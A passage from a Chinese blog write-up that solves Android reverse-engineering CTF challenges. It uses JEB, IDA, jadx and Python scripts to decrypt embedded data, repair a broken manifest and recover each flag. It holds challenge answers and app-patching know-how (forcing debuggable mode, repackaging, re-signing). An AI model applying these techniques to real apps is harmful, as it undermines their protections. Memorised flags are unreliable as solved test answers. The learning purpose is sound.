['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']\na_alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']\nfor i in flag:\n    halflag = a_alphabet.index(i)\n    ans += b_alphabet[v4[v5[halflag]]]\n    temp = v4[0]\n    v4.pop(0)\n    v4.append(temp)\n    temp = b_alphabet[0]\n    b_alphabet.pop(0)\n    b_alphabet.append(temp)\nprint(ans)\n'''\nvenividivkcr\n'''\n```\n\n{% asset_img 8.7.png 运行成功 %}\n\n嘤嘤嘤终于成功了，在做的时候看漏了很多细节，所以正确的flag一直出不来，还是要耐心一点！\n\n```\nflag{venividivkcr}\n```\n\n# 9. Ph0en1x-100\n\n{% asset_img 9.1.png 运行程序 %}\n\n载入AK，看到有lib文件。载入jeb分析源码。\n\n{% asset_img 9.2.png jeb分析 %}\n\n而getFlag和encrypt都是Native方法，需要在so文件查看详细内容。将程序解包，拿x86目录下的so文件载入IDA，查看getFlag和encrypt方法。\n\nencrypt方法就是将输入的字符串中的每个字符的ASCII码都减1。\n\n{% asset_img 9.3.png IDA分析 %}\n\ngetFlag方法看得就有点懵逼了，如果静态分析是在困难的话，可以考虑动态调试。\n\n{% asset_img 9.4.png IDA分析 %}\n\n动态调试需要满足`android:debuggable=\"true\"`，没有就要在AK中编辑添加，重新编译签名。\n\n动态调试方法可看 https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81 我就在这偷下懒了。\n\n刚才静态分析中，很明显看到一个循环，那我们就在循环的下一句下断点，在程序中输入字符串点击按钮，IDA停在断点处。此时，查看寄存器窗口EDI的值，点击小箭头，跟随地址。\n\n{% asset_img 9.5.png IDA动态调试 %}\n\n{% asset_img 9.6.png IDA动态调试 %}\n\n到了这里还没行，循环解决了但getFlag方法还未结束。F8步过观察字符串的变化。运行到快要结束时字符串已经不再变化了。在F8步过的过程中，发现`.`变成了`e`。所以正确的getFlag的返回值应该为：\n\n```\nek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|\n```\n\n所以我们输入的字符串中每个字符-1就是上面这个字符串。编写脚本：\n\n```python\nflag = \"ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|\"\nans = \"\"\nfor i in flag:\n    ans += chr(ord(i) + 1)\nprint(ans)\n'''\nflag{Ar3_y0u_go1nG_70_scarborough_Fair}\n'''\n```\n\n# 10. 黑客精神\n\n运行程序，注册码保存后直接退出。\n\n{% asset_img 10.1.png 运行程序 %}\n\n载入AK，有so文件，因为没有x86目录，如果要动态调试的话就要开我那个慢得要死的AS原生模拟器了。\n\n载入jeb，分析源码：\n\n{% asset_img 10.2.png jeb分析 %}\n\n{% asset_img 10.3.png jeb分析 %}\n\n{% asset_img 10.4.png jeb分析 %}\n\n{% asset_img 10.5.png jeb分析 %}\n\n看到有Log语句，赶紧打开AS连接上模拟器运行一下看看Log。程序一进去就显示m=0，然后再m=Xman。\n\n{% asset_img 10.6.png AS中Logcat窗口 %}\n\n说明程序在打开窗口前就已经载入so文件读取m的值，但它是静态的，如果我们注册过的话，程序会读取m=1，不会让我们再次注册。so文件的onCreate方法中，第一句就是初始化SN，所以m的值应该是在native方法initSN中存着。\n\n将so文件载入IDA，在导出表里找不到initSN方法，也找不到所有native方法，但看到了JNI_Onload，说明整个过程都是在JNI_Onload里动态完成的。\n\n{% asset_img 10.7.png IDAExport表 %}\n\n点进JNI_Onload函数，查看源码：\n\n{% asset_img 10.8.png IDA分析 %}\n\n{% asset_img 10.9.png IDA分析 %}\n\n{% asset_img 10.10.png IDA分析 %}\n\n所以`EoPAoY62@ElRD`应该就是注册码，但输入发现不对...Logcat窗口还是显示m=0。\n\n那继续分析saveSN。\n\n{% asset_img 10.11.png IDA分析 %}\n\n现在可以捋一下思路了，`W3_arE_whO_we_ARE`是要加密的字符串，`EoPAoY62@ElRD`相当于密钥，作为参数传入saveSN。v7存着的就是密钥。\n\n把这个加密算法用Python写一遍：\n\n```python\nflag = \"W3_arE_whO_we_ARE\"\nflagarr = list(flag)\nkey = \"EoPAoY62@ElRD\"\nkeyarr = list(key)\nans = \"\"\nv9 = 2016\nfor i in range(13):\n    if (i%3 == 1):\n        v9 = (v9 + 5) % 16\n        v11 = flagarr[v9 + 1]\n    elif i%3 == 2:\n        v9 = (v9 + 7) % 15\n        v11 = flagarr[v9 + 2]\n    else:\n        v9 = (v9 + 3) % 13\n        v11 = flagarr[v9 + 3]\n    ans += chr(ord(keyarr[i]) ^ ord(v11))\nprint(ans)\n'''\n201608Am!2333\n'''\n```\n\n最后一个work方法，查看它的内存，里面包含着flag的格式。\n\n{% asset_img 10.12.png IDA分析 %}\n\n```\nxman{201608Am!2333}\n```\n\n# 11. APK逆向\n\n同Bugku的mobile1。https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1 \n\n# 12. 人民的名义-抓捕赵德汉1-200\n\n下载下来的是jar包，使用命令`jar -xvf 1-200.jar`解压jar包。\n\n```\nC:\\Users\\dell\\Desktop>jar -xvf 1-200.jar\n  已解压: META-INF/MANIFEST.MF\n  已解压: CheckPassword.class\n  已解压: CheckInterface.class\n  已解压: ClassEnc\n  已解压: .project\n  已解压: .classpath\n  已解压: newClassName.class\n```\n\n在AS或eclipse中创建一个项目，将jar包中的`.class`文件放到项目的class目录下即可查看源码。\n\n{% asset_img 12.2.png 查看源码 %}\n\n{% asset_img 12.3.png 查看源码 %}\n\n{% asset_img 12.1.png 查看源码 %}\n\n{% asset_img 12.4.png 查看源码 %}\n\n这个MD5解出来是`monkey99`，拿去试了一下，发现flag就是这个。\n\n```\nflag{monkey99}\n```\n\n# 13. 基础android\n\n{% asset_img 13.1.png 运行程序 %}\n\n载入AK没什么发现，载入jeb分析源码。\n\n{% asset_img 13.2.png jeb分析 %}\n\n{% asset_img 13.3.png jeb分析 %}\n\n```python\nimport string\nbase = string.ascii_uppercase + string.ascii_lowercase + string.digits + \"-+_<>?/\\|{}()!@#$%^&*~`\"\nlen = 12\nans = \"\"\nfor i in range(len):\n    for j in base:\n        s1 = 255-i-100-ord(j)\n        if s1 == 48:\n            ans += j\nprint (ans)\n'''\nkjihgfedcba`\n'''\n```\n\n拿到密码后继续去到第二关。\n\n{% asset_img 13.4.png jeb分析 %}\n\n那就再看看这个程序还开了哪个类我们还没有分析。`GetAndChange`和`NextContent`我们还没有分析，进去看看。\n\n{% asset_img 13.5.png jeb分析 %}\n\n{% asset_img 13.6.png jeb分析 %}\n\n{% asset_img 13.7.png jeb分析 %}\n\n之后再也没有任何操作了，我们已经看到图片了，所以`NextContent`不是关键类。返回到`GetAndChange`类，找一下`BroadcastReceiver`是干什么用的。\n\n`BroadcastReceiver`详解：https://blog.csdn.net/huiblog/article/details/53234544 \n\n{% asset_img 13.8.png croadcastreceier静态注册 %}\n\n回到`Manifest`发现果然有静态注册。\n\n{% asset_img 13.9.png 静态注册 %}\n\n将`android.is.very.fun`作为显示码输入，但我点击按钮没有任何反应...但是之前不是分析`time_2.zip`转换为图片嘛，直接解压不行，因为它本来就不是zip压缩包。所以将后缀名修改为jpg就可以看到图片了。\n\n{% asset_img 13.11.png jfif %}\n\n{% asset_img 13.10.png flag %}\n\n```\nflag{08067-wlecome}\n```\n\n# 14. easy-dex\n\n在模拟器运行，点一下屏幕就一直在闪，五颜六色地闪。\n\n载入AK，没有找到smali文件，但有一个so文件。并且在`AndroidManifest.xml`文件中能看到有两个丢失的但程序需要的smali文件。`MainActivity`和`NativeActivity`。`MainActivity`大家都知道啦，一般是安卓程序的入口。但我们发现这个程序的入口是`NativeActivity`，这个是什么呢？\n\n{% asset_img 14.4.png 两个smali文件 %}\n\n写android纯c++的程序需要用到`NativeActivity`，这个`NativeActivity`就是一个一般的java类， 和普通的activity没有区别。`NativeActivity` 是android sdk自带的一个activity。android的纯c++的程序也是需要一个java虚拟机来运行的。`NativeActivity`通过`native_app_glu`来启动我们的c++线程，传递各种activity事件给c++代码。`native_app_glu`在ndk的`sources\\android`目录里面，将`native_app_glu`当作我们工程的静态库，这个静态库里面封装好了，会创建一个线程，这个线程里面会调用一个`android_main(android_app* pApplication)`的函数，因此，我们c++这边的入口函数就是`android_main()`。我们在这个`android_main()`函数里面的任务就是进行消息循环，做各种任务。\n\n解包，载入IDA查看so文件。找到`android_main`函数，点进去。\n\n{% asset_img 14.1.png IDA分析 %}\n\n也就是说要在10s内要摇100次手机。\n\n{% asset_img 14.2.png IDA分析 %}\n\n{% asset_img 14.3.png IDA分析 %}\n\n看了个大概，再详细分析代码。\n\n{% asset_img 14.5.png IDA分析 %}\n\n{% asset_img 14.6.png IDA分析 %}\n\n{% asset_img 14.7.png IDA分析 %}\n\n所以我们首先取出`unk_7004`里面的加密数据，再将它解密，再解压缩得出dex内容将它写入文件中。\n\nFile -> Script commond，选择Python，编写ida dump脚本将数据提取出来：\n\n```python\nfrom idaapi import *\naddr = 0x7004\nsize = 0x3CA10\nfile2Write = '.\\\\cipherdata'\nwith open(file2Write,'wb') as f:\n    f.write(get_bytes(addr,size))\n```\n\n在so文件的同目录下就会生成一个`cipherdata`文件。接下来给这个文件进行解密操作。\n\n```python\nimport zlib\nfile2Read = '.\\\\cipherdata'\nfile2Write = '.\\\\easydex.dex'\n\nwith open(file2Read, 'rb') as f2R:\n    data = list(f2R.read())\n    size = 0x3CA10\n    times = 0\n\n    while True:\n        #10次1组\n        if times <= 89:\n            timesDivide10 = int(times / 10)\n\n            #10字节1组\n            if times % 10 == 9:\n                sizesDivide10 = int(size / 10)\n                i = 0\n                for _ in range(sizesDivide10):\n                    data[sizesDivide10 * timesDivide10 + i] ^= times\n                    i += 1\n\n                #次数为89次时\n                if times == 89:\n                    j = (timesDivide10 + 1) * sizesDivide10\n                    while j < size:\n                        data[j] ^= 89\n                        j += 1\n                    break\n        times += 1\n\n#解压数据\ndata = zlib.decompress(bytes(data))\n\n#判断解压出的数据是否是dex格式\ntype = data[0:3].decode(\"utf8\")\nif type == 'dex':\n    #将数据写入文件\n    with open(file2Write, 'wb') as f2W:\n        f2W.write(data)\n```\n\n将dex文件载入jeb，就可以查看这个程序的`MainActivity`类了。\n\n{% asset_img 14.8.png jeb分析 %}\n\n{% asset_img 14.9.png jeb分析 %}\n\n{% asset_img 14.10.png jeb分析 %}\n\n{% asset_img 14.11.png jeb分析 %}\n\n{% asset_img 14.12.png jeb分析 %}\n\n那么，先找密钥。密钥的id号为`2131099683`，转换成十六进制为`0x7F060023`。将dex重命名为`classes.dex`放到解包目录下，重打包。解包目录下就会生成一个`bulid`目录。\n\n{% asset_img 14.13.png 资源文件 %}\n\n将`resources.arsc`载入jadx，查找id号。\n\n{% asset_img 14.14.png jadx分析 %}\n\n继续查找`two_fish`，找到一串字符串，这个就是密钥。\n\n{% asset_img 14.15.png jadx分析 %}\n\n```\nI have a male fish and a female fish.\n```\n\nTwofish是什么？它其实是一个分组加密算法！Twofish是布鲁斯·施奈尔带领的项目组于1998年研发的区块加密算法。美国国家标准技术研究所(NIST)公开招募的高级加密标准（AES）算法最终候选算法之一，但最终并未当选高级加密标准算法。双鱼算法的标志性特点是它采用了和密钥相关的替换盒（S盒）。密钥输入位的一半被用于“真正的”加密流程进行编排并作为Feistel的轮密钥使用，而另一半用于修改算法所使用的S盒。双鱼算法的密钥编排非常复杂。软件实现的128位双鱼算法在大多数平台上的运行速度不及最终获胜的128位的AES标准算法Rijndael，不过，256位的双鱼算法运行速度却较AES-256稍快。包括Twofish-ECB, Twofish-CBC, Twofish-CTR, Twofish-OFB, Twofish-CFB。\n\n所以再来捋一下思路。我们输入的字符串与密钥进行Twofish加密的结果是字节数组m。密钥经过&0xFF转换不需要我们手动操作，因为网上的解密算法已经包含在内了。但网上的加密算法得出来的不是带负数的字节数组，而是Base64或hex。所以我们可以先将字节数组转换成Base64的形式，再拿去解密。\n\n```python\nimport base64\nflag = [-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 31, 24, -91, -112, -83, 64, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 117, 29, -44, 6, 112, -4, 81, 84, 9, 22, -51, 95, -34, 12, 47, 77]\ndata = []\nfor i in flag:\n    data.append(i&0xFF)\nprint(base64.b64encode(bytes(data)))\n'''\nb'iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N'\n'''\n```\n\n{% asset_img 14.16.png twofish解密 %}\n\n```\nqwb{TH3y_Io<e_EACh_OTh3r_FOrEUER}\n```\n\n# 15. 你是谁\n\n{% asset_img 15.1.jpg 运行程序 %}\n\n载入AK，有so文件。载入jeb，找到`MainActivity`中的`onCreate`方法。\n\n{% asset_img 15.2.png jeb分析 %}\n\n{% asset_img 15.3.png jeb分析 %}\n\n{% asset_img 15.4.png jeb分析 %}\n\n{% asset_img 15.5.png jeb分析 %}\n\n```\n11 12 17 18 20 23 26 29 30 34 35 39 40 49 51 58 62 67 73 76 84 85\n```\n\n按照上面点位点好后，弹出`Right design`，点击按钮，弹出`通过爱的验证`。好像并没有什么用。再往上找找源码，发现有flag字样。\n\n{% asset_img 15.6.png jeb分析 %}\n\n中文意思是“你获得了已经排序过的flag”。\n\n```python\nprint(chr(20667))\nprint(chr(25105))\nprint(chr(26159))\nprint(chr(36924))\n'''\n傻\n我\n是\n逼\n'''\n```\n\n结合题目和代码，这个重新排序应该是“我是傻逼”。而它说了，那个是排序过的flag，而正确的flag应该为`25105 26159 20667 36924`。\n\n```\nflag{25105 26159 20667 36924}\n```\n\n# 16. Android2.0\n\n{% asset_img 16.1.png 运行程序 %}\n\n载入AK发现有so文件，载入jeb分析源码。\n\n{% asset_img 16.2.png jeb分析 %}\n\n{% asset_img 16.3.png jeb分析 %}\n\n解包，将so文件载入IDA，分析`getResult`方法。\n\n{% asset_img 16.4.png IDA分析 %}\n\n{% asset_img 16.5.png IDA分析 %}\n\n尝试编写Python脚本：\n\n```python\nv5 = \"LN^dl\"\nv5arr = list(v5)\nv6 = [0x20, 53, 45, 0x16, 97]\nv7 = list(\"AFBo}\")\nans = \"\"\nfor i in range(4):\n    ans += chr((ord(v5arr[i]) ^ 0x80) // 2)\nans += 'l'\nfor i in range(4):\n    ans += chr(ord(v5arr[i]) ^ v6[i])\nans += 'a'\nfor i in range(4):\n    ans += chr(ord(v7[i]) ^ v6[i])\nans += '}'\nprint(ans)\n'''\nfgorll{sraasoy}\n'''\n```\n\n提交flag发现不对，看看哪里漏了。最后发现`Init`函数不是简单的平均分成3组，而是对正确的flag的每个索引除以3取余得到`fgorll{sraasoy}`。\n\n```python\nans = \"fgorll{sraasoy}\"\nansarr = list(ans)\nans = \"\"\nfor i in range(5):\n    ans += ansarr[i] + ansarr[i+5] + ansarr[i+10]\nprint(ans)\n'''\nflag{sosorryla}\n'''        \n```\n\n# 17. boomshakalaka-3\n\n啊好讨厌为什么它是游戏！！我已经玩了好几分钟了！\n\n{% asset_img 17.1.png 运行程序 %}\n\n载入AK看到它有so文件，载入jeb分析源码：\n\n{% asset_img 17.2.png jeb分析 %}\n\n这个base64解码得`bazingaaaa`。诶结果不是这个。进去a类看看吧。\n\n{% asset_img 17.3.png jeb分析 %}\n\nSharedPreferences是一个轻量级的存储类，特别适合用于保存软件配置参数。使用SharedPreferences保存数据，其背后是用xml文件存放数据，文件存放在/data/data/程序包名/shared_prefs目录下。\n\n```java\npublic abstract SharedPreferences getSharedPreferences(String name, int mode);\n```\n\n第一个参数是存储时的名称，第二个参数则是文件的打开方式。\n\n那我们先找找它的xml文件吧。这个程序的包名为`com.example.plane`，包名可在`AndroidManifest.xml`的`manifest`标签中找到。\n\n{% asset_img 17.4.png 程序包名 %}\n\n{% asset_img 17.5.png xml文件 %}\n\n{% asset_img 17.6.png xml文件 %}\n\n所以可以推测`N0`和`MG`被写进了`Cocos2dxPrefsFile.xml`文件中。\n\n{% asset_img 17.7.png jeb分析 %}\n\n但打开`Cocos2dxPrefsFile.xml`文件却发现不止这两个字符串。我刚才玩了两次，出现了两个极为相似的字符串。\n\n{% asset_img 17.8.png xml文件 %}\n\n那就再玩几次试试。我发现每次关闭程序再打开又重新写入`MGN0`，而不关闭程序重新玩不会写入`MGN0`，每次结束都会以`dz99`为结束标志。\\*\\*里面的是每个串的区别。\n\n```\nMGN0ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99\n    ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRzRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRz*dz99\n    ZntDMGNvUzJkX0FuRHJvMWdz99\n    ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99\n```\n\n这些星号里面的串有些区别，但又是固定出现的，比如都是`Rf`、`RV`等等。说明在某个内存中存有这些字符。解包将so文件载入IDA，在函数名窗口搜索`score`，发现有好多这些字符串。\n\n{% asset_img 17.9.png IDA分析 %}\n\n原来`MW`其实也是包含在里面的。将这些字符串组合起来`MWRfRzBtRV9Zb1VfS24w`，再将前缀和后缀加上`MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99`。用Base64解码得`0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}`。为什么用Base64，其实题目上面的flag.xml中的Base64字符串已经暗示得很清楚了。\n\n```\n0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}\n```\n\n# 18. Illusion\n\n运行程序。\n\n{% asset_img 18.1.png 运行程序 %}\n\n载入AK，有一个Flag文件，打开出现一串字符串`Ku@'G_V9v(yGS`。\n\n{% asset_img 18.2.png AK中看到Flag文件 %}\n\n载入jeb，分析源码。\n\n{% asset_img 18.3.png jeb分析 %}\n\n将so文件载入IDA查看`CheckFlag`方法。\n\n{% asset_img 18.4.png IDA分析 %}\n\n如果要将算法逆过来，就需要将Flag里的字符串减32再左移32位。\n\n```python\nflag = list(\"Ku@'G_V9v(yGS\")\nfor i in range(len(flag)):\n    flag[i] = (ord(flag[i]) - 32) << 32\nprint(flag)\n'''\n[184683593728, 365072220160, 137438953472, 30064771072, 167503724544, 270582939648, 231928233984, 107374182400, 369367187456, 34359738368, 382252089344, 167503724544, 219043332096]\n'''\n```\n\n所以`sub_10C0`每次循环得出的值就是上面这一串数字。进去`sub_10C0`看看算法。\n\n{% asset_img 18.5.png IDA分析 %}\n\n{% asset_img 18.6.png IDA分析 %}\n\n(说着随机选取，结果还是认真算了)Flag字符串长度为13，所以在`aE116c5c66e7b37`数组中只取前13个字符。\n\n```\n.rodata:000023C8                 ; ORG 0x23C8\n.rodata:000023C8 aE116c5c66e7b37 DCB \"e116c5c66e7b373d912cb9b885b48913\",0\n```\n\n前13个字符为`e116c5c66e7b3`，其中最大的ASCII码为`e`(101)，最小是`1`(49)。而我们可以输入的可视化字符的ASCII码范围是32\\~126。所以`v9[i]+aE116c5c66e7b37[i]-64`的范围应该在17\\~163。照着IDA的代码抄一遍：\n\n```python\nfor a1 in range(17,164):\n    a2 = 93\n    v2 = a1 ^ a2\n    v3 = 1\n    v4 = 0\n    if((a2 & 0x80000000) != 0):\n        a2 = -a2\n    if((a1 & 0x80000000) != 0):\n        a1 = -a1\n    if(a1 >= a2):\n        while a2<0x10000000 and a2<a1:\n            a2 *= 16\n            v3 *= 16\n        while a2<0x80000000 and a2<a1:\n            a2 *= 2\n            v3 *= 2\n        while True:\n            if(a1 >= a2):\n                a1 -= a2\n                v4 |= v3\n            if(a1 >= a2 >> 1):\n                a1 -= a2 >> 1\n                v4 |= v3 >> 1\n            if(a1 >= a2 >> 2):\n                a1 -= a2 >> 2\n                v4 |= v3 >> 2\n            if(a1 >= a2 >> 3):\n                a1 -= a2 >> 3\n                v4 |= v3 >> 3\n            if a1 == 0:\n                break\n            v3 >>= 4\n            if v3 == 0:\n                break\n            a2 >>= 4\n    if v2 < 0:\n        v4 = -v4\n    print(v4, end = \" \")\n'''\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .\n'''\n```\n\n在这个范围完全没有这么大的数值...而且在这个范围要不就返回0要不就返回1。肯定是哪里出问题了。呜呜我看了牛牛们的wp说这个是假的，真的`CheckFlag`在`JNI_Onload`函数里，我就知道！！我就说导出表都有`CheckFlag`了怎么还有个`JNI_Onload`！以后记住从`JNI_Onload`进去准没错，还是没能抵挡住`CheckFlag`的诱惑。\n\n{% asset_img 18.9.png IDA分析 %}\n\n{% asset_img 18.10.png IDA分析 %}\n\n{% asset_img 18.11.png IDA分析 %}\n\n可以继续试试参数范围。`aLjavaLangStrin_0`存的字符串为`(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;`。取前13个字符为`(Ljava/lang/S`。最小的ASCII码为`40`(`(`)，最大的ASCII码为`118`(v)。所以`v10[i]+aLjavaLangStrin_0[i]-64`的范围在8~180。\n\n```python\n'''\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .\n'''\n```\n\n还是要不就是0要不就是1。这个时候就不要想是不是你的问题了！肯定是IDA反汇编的错！所以接下来要看汇编代码找到正确的逻辑。\n\n{% asset_img 18.7.png IDA分析 %}\n\n对于栈的立即数，可以右键 -> Q算得栈的偏移值。\n\n{% asset_img 18.8.jpg IDA分析 %}\n\n{% asset_img 18.12.png IDA分析 %}\n\n{% asset_img 18.13.png IDA分析 %}\n\n{% asset_img 18.14.png IDA分析 %}\n\n{% asset_img 18.15.png IDA分析 %}\n\n{% asset_img 18.16.png IDA分析 %}\n\n到这已经将所有细节都分析了，除了`sub_1028`，如果它反编译没错的话那答案基本就已经出来了。\n\n```\nflag = ((输入的字符串+内存字符串-64) - sub_1028(输入的字符串+内存字符串-64, 93) * 93) + 32\n```\n\n编写脚本：\n\n```python\nimport string\nflag = list(\"Ku@'G_V9v(yGS\")\nstr = list(\"(Ljava/lang/S\")\nans = \"\"\n#输出可打印字符串\ninput = string.printable\n\ndef sub_1028(a1):\n    a2 = 93\n    v2 = a1 ^ a2\n    v3 = 1\n    v4 = 0\n    if((a2 & 0x80000000) != 0):\n        a2 = -a2\n    if((a1 & 0x80000000) != 0):\n        a1 = -a1\n    if(a1 >= a2):\n        while a2<0x10000000 and a2<a1:\n            a2 *= 16\n            v3 *= 16\n        while a2<0x80000000 and a2<a1:\n            a2 *= 2\n            v3 *= 2\n        while True:\n            if(a1 >= a2):\n                a1 -= a2\n                v4 |= v3\n            if(a1 >= a2 >> 1):\n                a1 -= a2 >> 1\n                v4 |= v3 >> 1\n            if(a1 >= a2 >> 2):\n                a1 -= a2 >> 2\n                v4 |= v3 >> 2\n            if(a1 >= a2 >> 3):\n                a1 -= a2 >> 3\n                v4 |= v3 >> 3\n            if a1 == 0:\n                break\n            v3 >>= 4\n            if v3 == 0:\n                break\n            a2 >>= 4\n    if v2 < 0:\n        return -v4\n    return v4\n\nfor i in range(len(flag)):\n    for j in input:\n        data = ord(j) + ord(str[i]) - 64\n        v4 = sub_1028(data)\n        if (data - v4 * 93) + 32 == ord(flag[i]):\n            ans += j\nprint(ans)\n'''\nCISCN{GJ5728}\n'''\n```\n\n# 19. APK逆向-2\n\n在模拟器上安装失败，解包不能解包，用AK不能反编译。那就把它后缀改为`.zip`，解压发现可以解压。没有找到smali目录，但有`classes.dex`和`resources.arsc`文件。这两个文件在jadx都可以打开，但`AndroidManifest.xml`文件显示乱码。\n\n{% asset_img 19.1.png xml文件 %}\n\n其实我们解压时就可以知道是`AndroidManifest.xml`的问题了。\n\n{% asset_img 19.2.png xml文件 %}\n\n那么接下来就是要仔细分析`AndroidManifest.xml`文件。\n\n---------------------------\n\n{% asset_img 19.3.png xml文件结构图 %}\n\n`AndroidManifest.xml`文件采用小端模式存储，可以大体分为四个部分：\n\n1. Header：头文件\n\n\n2. String Chunk：存储字符串资源的程序块\n\n3. ResourceId Chunk：存储资源id的程序块\n\n4. XmlContent Chunk：存储xml内容程序块，其中包含了五个部分，Start Namespace Chunk 、End Namespace Chunk 、Start Tag Chunk 、End Tag Chunk 、Text Chunk\n\n**Header**\n\nmagicnumber：魔数，固定值 0x0008003(16进制)，占四个字节。\n\nfilesize：xml文件总字节数 ，占四个字节。\n\n**String Chunk**\n\nChunkType：StringChunk类型，4个字节 ，固定值 0x001c0001\n\nChunkSize：StringChunk大小 ，4个字节\n\nStringCount：StringChunk字符串的个数，4个字节\n\nStyleCount：StringChunk样式的个数，4个字节，固定值 0x00000000\n\nUnkown： 位置区域，4个字节，固定值 0x00000000解析时候需要略过4个字节\n\nStringPoolOffset：字符串池偏移量，4个字节，偏移量相对StringChunk头部位置\n\nStylePoolOffset：样式池偏移量，4个字节，偏移量相对于StringChunk头部位置，固定值 0x00000000 ，这个字段基本没用到过\n\nStringOffsets：每个字符串在字符串池中的相对偏移量，int数组，它的大小是 StringCount*4 个字节\n\nStyleOffsets：每个样式的偏移量，int数组，它的大小是 StyleCount*4 个字节\n\nString Pool：字符串池，存储了所有的字符串\n\nStyle Pool：样式池，存储了所有的样式，一般为0\n\n**ResourceId Chunk**\n\nChunkType：ResourceldChunk的类型，占4个字节，固定值 0x00080180\n\nChunkSize：ResourceldChunk的大小，占4个字节\n\nResourceIds：int数组，大小为(ChunkSize - 8) / 4 ，减 8是减去头部大小的8个字节(ChunkType和ChunkSize)\n\n**XmlContent Chunk**\n\nXmlContentChunk 这部分表示的是存储了清单文件的详细信息，包含的5项，其中Start Namespace Chunk 和End Namespace Chunk 这两个可以合并一个来说明， 因为它们的结构完全一致，解析过程也是一样的。至于End Tag Chunk一共有6个数据，也就是 Start Tag Chunk 的前 6 项，这里不做单独解析和说明。End Tag Chunk这个跟清单文件标签一样的，就是给解析出来的标签加上结束标签一样。Text Chunk这个模块在010 Editor模板里并没有用到过。\n\n\n\n*Start Namespace Chunk*主要包含一个清单文件的命令空间内容\n\nChunkType：Chunk的类型，4个字节 ，固定值 0x00100100\n\nChunkSize：Chunk的大小 ，4个字节\n\nLineNumber：清单文件中的行号， 4个字节\n\nUnknown：未知区域， 4个字节\n\nPrefix：命名空间的前缀， 4个字节\n\nUri：命名空间的URI， 4个字节\n\n\n\n*Start Tag Chunk*主要存放清单文件中的标签信息\n\nChunkType：Chunk的类型，4个字节 ，固定值 0x00100102\n\nChunkSize：Chunk的大小 ，4个字节\n\nLineNumber：清单文件中的行号， 4个字节\n\nUnknown：未知区域， 4个字节\n\nNamespace Uri：命名空间用到的url在字符串的索引，值为 -1 表示没有用到命名空间 uri。标签的一般都没有使用到命名空间，4个字节\n\nName：标签名称(在字符串中的索引值)，4个字节\n\nFlags：标签类型例如开始标签还是结束标签，固定值0x00140014，4个字节\n\nAttribute Count ：标签包含的属性个数，4个字节\n\nClass Attribute ：标签包含的类属性，此项值常为 0，4个字节\n\nAttributes ：属性内容集合,每个属性固定 20 个字节，包含 5 个字段，每个字段都是 4 字节无符号 int，解析的时候需要注意Type这个值做一次处理需要右移24位。各个字段含义如下：\n\n- NamespaceUri：属性的命名空间uri 在字符串池中的索引\n\n\n- Name：属性名称在字符串池中的索引\n\n\n- ValueStr：属性值\n\n\n- Type：属性类型\n\n\n- Data：属性数据\n\n----------------\n\n首先查看xml的固定值是否有误。ChunkType应该为01 00 1c 00。而且StylePoolOffset应该为00 00 00 00。修改完后一定要点保存，而不是另存为，因为我发现另存为后有些其它值也被修改了，导致重打包后再解包时出现错误！\n\n{% asset_img 19.4.png xml文件 %}\n\n{% asset_img 19.9.png xml文件 %}\n\n忽然发现解包时异常已经告诉我有其中一个错误了...\n\n{% asset_img 19.5.png apk解包 %}\n\n将它重打包时出现没有`apktool.yml`文件错误，将其它apk里面的`apktool.yml`复制一份下来，将apk文件名改了即可。\n\n{% asset_img 19.7.png apktool.yml %}\n\n{% asset_img 19.6.png apktool.yml %}\n\n这次终于成功解包了。\n\n{% asset_img 19.8.png 解包成功 %}\n\n所以xml有什么什么神秘的呢？发现中间那个字符串就是flag。\n\n{% asset_img 19.10.png xml文件 %}\n\n```\n8d6efd232c63b7d2\n```\n\n# 20. ill-intentions\n\n{% asset_img 20.1.png 运行程序 %}\n\n翻译一下就是，选择您希望与之交互的MainActivity，待办事项：添加按钮来选择活动，现在使用的是Send_to_Activity。\n\n载入AK看可不可以直接修改`AndroidManifest.xml`的入口，不行。程序还是那个界面。\n\n{% 